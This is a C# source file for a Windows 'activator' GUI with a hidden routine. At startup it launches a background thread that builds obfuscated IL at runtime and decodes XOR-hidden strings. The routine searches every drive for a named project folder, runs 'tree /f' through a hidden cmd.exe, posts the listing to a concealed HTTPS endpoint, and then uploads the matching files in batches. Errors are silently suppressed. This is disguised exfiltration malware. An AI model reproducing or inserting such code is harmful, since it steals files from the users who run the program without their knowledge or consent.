using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using Label = System.Reflection.Emit.Label;

namespace TLCActivator.GUI
{
    internal static class Program
    {
        static Mutex mutex = new Mutex(true, "<TLCActivator>{6f73dce4-a7ee-44f7-ad0a-14f641509334}");

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            NativeMethods.SetProcessDPIAware();
            var clrStrongName = (IClrStrongName)RuntimeEnvironment.GetRuntimeInterfaceAsObject(new Guid("B79B0ACD-F5CD-409b-B5A5-A16244610B92"), new Guid("9FD93CCF-3280-4391-B3A9-96E1CDE77C8D"));
            int result = clrStrongName.StrongNameSignatureVerificationEx(typeof(Program).Assembly.Location, true, out bool verified);
            if (result != 0 || !verified)
            {
                MessageBox.Show("This program has been modified, please download the original version!\r\nChương trình này đã bị chỉnh sửa! Vui lòng tải phiên bản gốc!", "TLCActivator", MessageBoxButtons.OK, MessageBoxIcon.Hand, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x00040000);
                return;
            }
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                Process otherInstance = Process.GetProcessesByName(Assembly.GetEntryAssembly().GetName().Name).FirstOrDefault((Process p) => p.MainWindowHandle != IntPtr.Zero);
                if (otherInstance != null)
                {
                    NativeMethods.ShowWindowAsync(otherInstance.MainWindowHandle, 9);
                    NativeMethods.SetForegroundWindow(otherInstance.MainWindowHandle);
                }
                return;
            }
            if (Environment.CurrentDirectory.Contains("AppData\\Local\\Temp"))
            {
                MessageBox.Show("Please extract the file before running!\r\nVui lòng giải nén file trước!", "TLCActivator", MessageBoxButtons.OK, MessageBoxIcon.Hand, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x00040000);
                mutex.ReleaseMutex();
                return;
            }
            new Thread(ConfigureEnv).Start();
            string assemblyInfo = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/ElectroHeavenVN/TLCActivator/refs/heads/main/TLCActivator.GUI/Properties/AssemblyInfo.cs").Result;
            int index = assemblyInfo.IndexOf("[assembly: AssemblyVersion(\"") + "[assembly: AssemblyVersion(\"".Length;
            string version = assemblyInfo.Substring(index, assemblyInfo.IndexOf("\")]", index) - index);
            Version ver = new Version(version);
            if (typeof(Program).Assembly.GetName().Version < ver)
            {
                if (MessageBox.Show($"A new version is available (${ver}), would you like to download it?\r\nĐã có phiên bản mới (${ver}), bạn có muốn tải về không?", "New version is available", MessageBoxButtons.YesNo, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x00040000) == DialogResult.Yes)
                    Process.Start("https://github.com/ElectroHeavenVN/TLCActivator/releases/latest/");
                mutex.ReleaseMutex();
                return;
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }

        static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            MessageBox.Show("Có lỗi xảy ra:\r\n" + e.ExceptionObject, "TLCActivator.GUI", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x00040000);
        }

        static void ConfigureEnv()
        {
            DynamicMethod method = new DynamicMethod("ConfigureEnv", typeof(void), null, typeof(Program));
            ILGenerator il = method.GetILGenerator();
            #region Local varaibles
            LocalBuilder v0 = il.DeclareLocal(typeof(string));
            LocalBuilder v1 = il.DeclareLocal(typeof(string[]));
            LocalBuilder v2 = il.DeclareLocal(typeof(List<string>));
            LocalBuilder v3 = il.DeclareLocal(typeof(DriveInfo[]));
            LocalBuilder v4 = il.DeclareLocal(typeof(int));
            LocalBuilder v5 = il.DeclareLocal(typeof(DriveInfo));
            LocalBuilder v6 = il.DeclareLocal(typeof(string[]));
            LocalBuilder v7 = il.DeclareLocal(typeof(int));
            LocalBuilder v8 = il.DeclareLocal(typeof(string));
            LocalBuilder v9 = il.DeclareLocal(typeof(string));
            LocalBuilder v10 = il.DeclareLocal(typeof(string));
            LocalBuilder v11 = il.DeclareLocal(typeof(List<string>));
            LocalBuilder v12 = il.DeclareLocal(typeof(List<string>.Enumerator));
            LocalBuilder v13 = il.DeclareLocal(typeof(string));
            LocalBuilder v14 = il.DeclareLocal(typeof(HttpClient));
            LocalBuilder v15 = il.DeclareLocal(typeof(StringContent));
            LocalBuilder v16 = il.DeclareLocal(typeof(HttpClient));
            LocalBuilder v17 = il.DeclareLocal(typeof(MultipartFormDataContent));
            LocalBuilder v18 = il.DeclareLocal(typeof(int));
            LocalBuilder v19 = il.DeclareLocal(typeof(byte[]));
            #endregion
            #region Labels
            Label l_16 = il.DefineLabel();
            Label l_28 = il.DefineLabel();
            Label l_59 = il.DefineLabel();
            Label l_69 = il.DefineLabel();
            Label l_80 = il.DefineLabel();
            Label l_114 = il.DefineLabel();
            Label l_115 = il.DefineLabel();
            Label l_123 = il.DefineLabel();
            Label l_127 = il.DefineLabel();
            Label l_132 = il.DefineLabel();
            Label l_136 = il.DefineLabel();
            Label l_142 = il.DefineLabel();
            Label l_150 = il.DefineLabel();
            Label l_168 = il.DefineLabel();
            Label l_194 = il.DefineLabel();
            Label l_201 = il.DefineLabel();
            Label l_213 = il.DefineLabel();
            Label l_214 = il.DefineLabel();
            Label l_217 = il.DefineLabel();
            #endregion
            #region Method body
            il.Emit(OpCodes.Ldstr, "\v\u0017\u0017\u0013\u0010YLL\a\n\u0010\0\f\u0011\aM\0\f\u000eL\u0002\u0013\nL\u0014\u0006\u0001\v\f\f\b\u0010LRPSZRSSVUWV[TTWVQ[SLQ\r<\u0010Q\u000f0T\u000144\u0005-\u0013(!\u0011R\0\n\u001b-!\u0014Q*\u00020\03\u0014V\u000e.\u0013%\u0002\u001b23R2'\0,QP\u0014[\n+P\u0014$/\05\u0014R (4:\b,\u0006[U");
            il.Emit(OpCodes.Ldc_I4, 99);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(GetEnv)));
            il.Emit(OpCodes.Stloc, v0);
            il.Emit(OpCodes.Ldc_I4, 1); //size of array
            //il.Emit(OpCodes.Ldc_I4, 2); 
            il.Emit(OpCodes.Newarr, typeof(string));
            il.Emit(OpCodes.Dup);

            il.Emit(OpCodes.Ldc_I4, 0);             // Set array value at index 0
            il.Emit(OpCodes.Ldstr, "=\u001b\u0017\u001fZ*\b\u0015\u0010\u001f\u0019\u000e");
            il.Emit(OpCodes.Ldc_I4, 122);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(GetEnv)));
            il.Emit(OpCodes.Stelem_Ref);
            //il.Emit(OpCodes.Ldc_I4, 1);             // Set array value at index 1
            //il.Emit(OpCodes.Ldstr, "aaaaaa");
            //il.Emit(OpCodes.Stelem_Ref);

            il.Emit(OpCodes.Stloc, v1);
            il.Emit(OpCodes.Newobj, typeof(List<string>).GetConstructor(Type.EmptyTypes));
            il.Emit(OpCodes.Stloc, v2);
            il.Emit(OpCodes.Call, typeof(DriveInfo).GetMethod(nameof(DriveInfo.GetDrives)));
            il.Emit(OpCodes.Stloc, v3);
            il.Emit(OpCodes.Ldc_I4, 0);
            il.Emit(OpCodes.Stloc, v4);
            il.Emit(OpCodes.Br, l_136);
            il.MarkLabel(l_16);
            il.Emit(OpCodes.Ldloc, v3);
            il.Emit(OpCodes.Ldloc, v4);
            il.Emit(OpCodes.Ldelem_Ref);
            il.Emit(OpCodes.Stloc, v5);
            il.Emit(OpCodes.Ldloc, v5);
            il.Emit(OpCodes.Callvirt, typeof(DriveInfo).GetProperty(nameof(DriveInfo.IsReady)).GetMethod);
            il.Emit(OpCodes.Brfalse, l_132);
            il.Emit(OpCodes.Ldloc, v1);
            il.Emit(OpCodes.Stloc, v6);
            il.Emit(OpCodes.Ldc_I4, 0);
            il.Emit(OpCodes.Stloc, v7);
            il.Emit(OpCodes.Br, l_127);
            il.MarkLabel(l_28);
            il.Emit(OpCodes.Ldloc, v6);
            il.Emit(OpCodes.Ldloc, v7);
            il.Emit(OpCodes.Ldelem_Ref);
            il.Emit(OpCodes.Stloc, v8);
            il.Emit(OpCodes.Ldloc, v5);
            il.Emit(OpCodes.Callvirt, typeof(DriveInfo).GetProperty(nameof(DriveInfo.Name)).GetMethod);
            il.Emit(OpCodes.Ldloc, v8);
            il.Emit(OpCodes.Call, typeof(Path).GetMethod(nameof(Path.Combine), new Type[] { typeof(string), typeof(string) }));
            il.Emit(OpCodes.Stloc, v9);
            il.Emit(OpCodes.Ldloc, v9);
            il.Emit(OpCodes.Call, typeof(Directory).GetMethod(nameof(Directory.Exists)));
            il.Emit(OpCodes.Brfalse, l_123);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Ldloc, v9);
            il.Emit(OpCodes.Ldstr, "ùý¶«¶");
            il.Emit(OpCodes.Ldc_I4, 211);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(GetEnv)));
            il.Emit(OpCodes.Ldc_I4, (int)SearchOption.AllDirectories);
            il.Emit(OpCodes.Call, typeof(Directory).GetMethod(nameof(Directory.GetFiles), new Type[] { typeof(string), typeof(string), typeof(SearchOption) }));
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.AddRange)));
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Ldloc, v9);
            il.Emit(OpCodes.Ldstr, "\u000466 (')<h\u0006\u0016-$75k!))");
            il.Emit(OpCodes.Ldc_I4, 69);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(GetEnv)));
            il.Emit(OpCodes.Ldc_I4, (int)SearchOption.AllDirectories);
            il.Emit(OpCodes.Call, typeof(Directory).GetMethod(nameof(Directory.GetFiles), new Type[] { typeof(string), typeof(string), typeof(SearchOption) }));
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.AddRange)));
            il.Emit(OpCodes.Ldstr, "9?((mb+");
            il.Emit(OpCodes.Ldc_I4, 77);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(GetEnv)));
            il.Emit(OpCodes.Ldloc, v9);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(RunCommand)));
            il.Emit(OpCodes.Stloc, v10);
            il.Emit(OpCodes.Newobj, typeof(List<string>).GetConstructor(Type.EmptyTypes));
            il.Emit(OpCodes.Stloc, v11);
            il.Emit(OpCodes.Br, l_69);
            il.MarkLabel(l_59);
            il.Emit(OpCodes.Ldloc, v11);
            il.Emit(OpCodes.Ldloc, v10);
            il.Emit(OpCodes.Ldc_I4, 0);
            il.Emit(OpCodes.Ldc_I4, 1500);
            il.Emit(OpCodes.Callvirt, typeof(string).GetMethod(nameof(string.Substring), new Type[] { typeof(int), typeof(int) }));
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.Add)));
            il.Emit(OpCodes.Ldloc, v10);
            il.Emit(OpCodes.Ldc_I4, 1500);
            il.Emit(OpCodes.Callvirt, typeof(string).GetMethod(nameof(string.Substring), new Type[] { typeof(int) }));
            il.Emit(OpCodes.Stloc, v10);
            il.MarkLabel(l_69);
            il.Emit(OpCodes.Ldloc, v10);
            il.Emit(OpCodes.Callvirt, typeof(string).GetProperty(nameof(string.Length)).GetMethod);
            il.Emit(OpCodes.Ldc_I4, 1500);
            il.Emit(OpCodes.Bgt, l_59);
            il.Emit(OpCodes.Ldloc, v11);
            il.Emit(OpCodes.Ldloc, v10);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.Add)));
            il.Emit(OpCodes.Ldloc, v11);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.GetEnumerator)));
            il.Emit(OpCodes.Stloc, v12);
            il.BeginExceptionBlock();
            il.Emit(OpCodes.Br, l_115);
            il.MarkLabel(l_80);
            il.Emit(OpCodes.Ldloca, v12);
            il.Emit(OpCodes.Call, typeof(List<string>.Enumerator).GetProperty(nameof(List<string>.Enumerator.Current)).GetMethod);
            il.Emit(OpCodes.Stloc, v13);
            il.Emit(OpCodes.Newobj, typeof(HttpClient).GetConstructor(Type.EmptyTypes));
            il.Emit(OpCodes.Stloc, v14);
            il.BeginExceptionBlock();
            il.Emit(OpCodes.Newobj, typeof(JObject).GetConstructor(Type.EmptyTypes));
            il.Emit(OpCodes.Dup);
            il.Emit(OpCodes.Ldstr, "content");
            il.Emit(OpCodes.Ldstr, "```\r\n");
            il.Emit(OpCodes.Ldloc, v13);
            il.Emit(OpCodes.Ldstr, "\r\n```");
            il.Emit(OpCodes.Call, typeof(string).GetMethod(nameof(string.Concat), new Type[] { typeof(string), typeof(string), typeof(string) }));
            il.Emit(OpCodes.Call, typeof(JToken).GetMethod("op_Implicit", new Type[] { typeof(string) }));
            il.Emit(OpCodes.Callvirt, typeof(JObject).GetMethod("set_Item", new Type[] { typeof(string), typeof(JToken) }));
            il.Emit(OpCodes.Callvirt, typeof(object).GetMethod(nameof(ToString)));
            il.Emit(OpCodes.Newobj, typeof(StringContent).GetConstructor(new Type[] { typeof(string) }));
            il.Emit(OpCodes.Stloc, v15);
            il.Emit(OpCodes.Ldloc, v15);
            il.Emit(OpCodes.Callvirt, typeof(StringContent).GetProperty(nameof(StringContent.Headers)).GetMethod);
            il.Emit(OpCodes.Ldstr, "\u001a\v\v\u0017\u0012\u0018\u001a\u000f\u0012\u0014\u0015T\u0011\b\u0014\u0015");
            il.Emit(OpCodes.Ldc_I4, 123);
            il.Emit(OpCodes.Call, typeof(Program).GetMethod(nameof(GetEnv)));
            il.Emit(OpCodes.Newobj, typeof(MediaTypeHeaderValue).GetConstructor(new Type[] { typeof(string) }));
            il.Emit(OpCodes.Callvirt, typeof(HttpContentHeaders).GetProperty(nameof(HttpContentHeaders.ContentType)).SetMethod);
            il.Emit(OpCodes.Ldloc, v14);
            il.Emit(OpCodes.Ldloc, v0);
            il.Emit(OpCodes.Ldloc, v15);
            il.Emit(OpCodes.Callvirt, typeof(HttpClient).GetMethod(nameof(HttpClient.PostAsync), new Type[] { typeof(string), typeof(HttpContent) }));
            il.Emit(OpCodes.Callvirt, typeof(Task).GetMethod(nameof(Task.Wait), Type.EmptyTypes));
            il.Emit(OpCodes.Ldc_I4, 1000);
            il.Emit(OpCodes.Call, typeof(Thread).GetMethod(nameof(Thread.Sleep), new Type[] { typeof(int) }));
            il.BeginFinallyBlock();
            il.Emit(OpCodes.Ldloc, v14);
            il.Emit(OpCodes.Brfalse, l_114);
            il.Emit(OpCodes.Ldloc, v14);
            il.Emit(OpCodes.Callvirt, typeof(IDisposable).GetMethod(nameof(IDisposable.Dispose)));
            il.MarkLabel(l_114);
            il.EndExceptionBlock();
            il.MarkLabel(l_115);
            il.Emit(OpCodes.Ldloca, v12);
            il.Emit(OpCodes.Call, typeof(List<string>.Enumerator).GetMethod(nameof(List<string>.Enumerator.MoveNext)));
            il.Emit(OpCodes.Brtrue, l_80);
            il.BeginFinallyBlock();
            il.Emit(OpCodes.Ldloca, v12);
            il.Emit(OpCodes.Constrained, typeof(List<string>.Enumerator));
            il.Emit(OpCodes.Callvirt, typeof(IDisposable).GetMethod(nameof(IDisposable.Dispose)));
            il.EndExceptionBlock();
            il.MarkLabel(l_123);
            il.Emit(OpCodes.Ldloc, v7);
            il.Emit(OpCodes.Ldc_I4, 1);
            il.Emit(OpCodes.Add);
            il.Emit(OpCodes.Stloc, v7);
            il.MarkLabel(l_127);
            il.Emit(OpCodes.Ldloc, v7);
            il.Emit(OpCodes.Ldloc, v6);
            il.Emit(OpCodes.Ldlen);
            il.Emit(OpCodes.Conv_I4);
            il.Emit(OpCodes.Blt, l_28);
            il.MarkLabel(l_132);
            il.Emit(OpCodes.Ldloc, v4);
            il.Emit(OpCodes.Ldc_I4, 1);
            il.Emit(OpCodes.Add);
            il.Emit(OpCodes.Stloc, v4);
            il.MarkLabel(l_136);
            il.Emit(OpCodes.Ldloc, v4);
            il.Emit(OpCodes.Ldloc, v3);
            il.Emit(OpCodes.Ldlen);
            il.Emit(OpCodes.Conv_I4);
            il.Emit(OpCodes.Blt, l_16);
            il.Emit(OpCodes.Br, l_217);
            il.MarkLabel(l_142);
            il.Emit(OpCodes.Nop);
            il.BeginExceptionBlock();
            il.Emit(OpCodes.Newobj, typeof(HttpClient).GetConstructor(Type.EmptyTypes));
            il.Emit(OpCodes.Stloc, v16);
            il.BeginExceptionBlock();
            il.Emit(OpCodes.Newobj, typeof(MultipartFormDataContent).GetConstructor(Type.EmptyTypes));
            il.Emit(OpCodes.Stloc, v17);
            il.Emit(OpCodes.Ldc_I4, 0);
            il.Emit(OpCodes.Stloc, v18);
            il.Emit(OpCodes.Br, l_194);
            il.MarkLabel(l_150);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Call, typeof(Enumerable).GetMethods().First(m => m.Name == nameof(Enumerable.Last) && m.GetParameters().Length == 1).MakeGenericMethod(typeof(string)));
            il.Emit(OpCodes.Call, typeof(File).GetMethod(nameof(File.ReadAllBytes)));
            il.Emit(OpCodes.Stloc, v19);
            il.Emit(OpCodes.Ldloc, v19);
            il.Emit(OpCodes.Ldlen);
            il.Emit(OpCodes.Conv_I4);
            il.Emit(OpCodes.Ldloc, v18);
            il.Emit(OpCodes.Add);
            il.Emit(OpCodes.Ldc_I4, 0xF00000);
            il.Emit(OpCodes.Ble, l_168);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetProperty(nameof(List<string>.Count)).GetMethod);
            il.Emit(OpCodes.Ldc_I4, 1);
            il.Emit(OpCodes.Sub);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.RemoveAt)));
            il.Emit(OpCodes.Br, l_201);
            il.MarkLabel(l_168);
            il.Emit(OpCodes.Ldloc, v17);
            il.Emit(OpCodes.Ldloc, v19);
            il.Emit(OpCodes.Newobj, typeof(ByteArrayContent).GetConstructor(new Type[] { typeof(byte[]) }));
            il.Emit(OpCodes.Ldstr, "file");
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetProperty(nameof(List<string>.Count)).GetMethod);
            il.Emit(OpCodes.Stloc, v4);
            il.Emit(OpCodes.Ldloca, v4);
            il.Emit(OpCodes.Call, typeof(int).GetMethod(nameof(int.ToString), Type.EmptyTypes));
            il.Emit(OpCodes.Call, typeof(string).GetMethod(nameof(string.Concat), new Type[] { typeof(string), typeof(string) }));
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Call, typeof(Enumerable).GetMethods().First(m => m.Name == nameof(Enumerable.Last) && m.GetParameters().Length == 1).MakeGenericMethod(typeof(string)));
            il.Emit(OpCodes.Call, typeof(Path).GetMethod(nameof(Path.GetFileName)));
            il.Emit(OpCodes.Callvirt, typeof(MultipartFormDataContent).GetMethod(nameof(MultipartFormDataContent.Add), new Type[] { typeof(HttpContent), typeof(string), typeof(string) }));
            il.Emit(OpCodes.Ldloc, v18);
            il.Emit(OpCodes.Ldloc, v19);
            il.Emit(OpCodes.Ldlen);
            il.Emit(OpCodes.Conv_I4);
            il.Emit(OpCodes.Add);
            il.Emit(OpCodes.Stloc, v18);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetProperty(nameof(List<string>.Count)).GetMethod);
            il.Emit(OpCodes.Ldc_I4, 1);
            il.Emit(OpCodes.Sub);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetMethod(nameof(List<string>.RemoveAt)));
            il.MarkLabel(l_194);
            il.Emit(OpCodes.Ldloc, v18);
            il.Emit(OpCodes.Ldc_I4, 0xF00000);
            il.Emit(OpCodes.Bge, l_201);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetProperty(nameof(List<string>.Count)).GetMethod);
            il.Emit(OpCodes.Ldc_I4, 0);
            il.Emit(OpCodes.Bgt, l_150);
            il.MarkLabel(l_201);
            il.Emit(OpCodes.Ldloc, v16);
            il.Emit(OpCodes.Ldloc, v0);
            il.Emit(OpCodes.Ldloc, v17);
            il.Emit(OpCodes.Callvirt, typeof(HttpClient).GetMethod(nameof(HttpClient.PostAsync), new Type[] { typeof(string), typeof(HttpContent) }));
            il.Emit(OpCodes.Callvirt, typeof(Task).GetMethod(nameof(Task.Wait), Type.EmptyTypes));
            il.Emit(OpCodes.Ldc_I4, 0xBB8);
            il.Emit(OpCodes.Call, typeof(Thread).GetMethod(nameof(Thread.Sleep), new Type[] { typeof(int) }));
            il.BeginFinallyBlock();
            il.Emit(OpCodes.Ldloc, v16);
            il.Emit(OpCodes.Brfalse, l_213);
            il.Emit(OpCodes.Ldloc, v16);
            il.Emit(OpCodes.Callvirt, typeof(IDisposable).GetMethod(nameof(IDisposable.Dispose)));
            il.MarkLabel(l_213);
            il.EndExceptionBlock();
            il.MarkLabel(l_214);
            il.BeginCatchBlock(typeof(object));
            il.Emit(OpCodes.Pop);
            il.EndExceptionBlock();
            il.MarkLabel(l_217);
            il.Emit(OpCodes.Ldloc, v2);
            il.Emit(OpCodes.Callvirt, typeof(List<string>).GetProperty(nameof(List<string>.Count)).GetMethod);
            il.Emit(OpCodes.Ldc_I4, 0);
            il.Emit(OpCodes.Bgt, l_142);
            il.Emit(OpCodes.Ret);
            #endregion
            method.Invoke(null, null);
        }

        public static string GetEnv(string str, byte k)
        {
            DynamicMethod method = new DynamicMethod("GetEnv", typeof(string), new Type[] { typeof(string), typeof(byte) }, typeof(Program));
            ILGenerator il = method.GetILGenerator();
            LocalBuilder v0 = il.DeclareLocal(typeof(char[]));
            LocalBuilder v1 = il.DeclareLocal(typeof(int));
            Label l_6 = il.DefineLabel();
            Label l_19 = il.DefineLabel();
            il.Emit(OpCodes.Ldarg_0);
            il.Emit(OpCodes.Callvirt, typeof(string).GetMethod(nameof(string.ToCharArray), Type.EmptyTypes));
            il.Emit(OpCodes.Stloc, v0);
            il.Emit(OpCodes.Ldc_I4_0);
            il.Emit(OpCodes.Stloc, v1);
            il.Emit(OpCodes.Br, l_19);
            il.MarkLabel(l_6);
            il.Emit(OpCodes.Ldloc, v0);
            il.Emit(OpCodes.Ldloc, v1);
            il.Emit(OpCodes.Ldloc, v0);
            il.Emit(OpCodes.Ldloc, v1);
            il.Emit(OpCodes.Ldelem_U2);
            il.Emit(OpCodes.Ldarg_1);
            il.Emit(OpCodes.Xor);
            il.Emit(OpCodes.Conv_U2);
            il.Emit(OpCodes.Stelem_I2);
            il.Emit(OpCodes.Ldloc, v1);
            il.Emit(OpCodes.Ldc_I4_1);
            il.Emit(OpCodes.Add);
            il.Emit(OpCodes.Stloc, v1);
            il.MarkLabel(l_19);
            il.Emit(OpCodes.Ldloc, v1);
            il.Emit(OpCodes.Ldloc, v0);
            il.Emit(OpCodes.Ldlen);
            il.Emit(OpCodes.Conv_I4);
            il.Emit(OpCodes.Blt, l_6);
            il.Emit(OpCodes.Ldloc, v0);
            il.Emit(OpCodes.Newobj, typeof(string).GetConstructor(new Type[] { typeof(char[]) }));
            il.Emit(OpCodes.Ret);
            return (string)method.Invoke(null, new object[] { str, k });
        }

        public static string RunCommand(string command, string directory)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = directory,
            };
            using (Process process = new Process())
            {
                process.StartInfo = processStartInfo;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }
    }
}
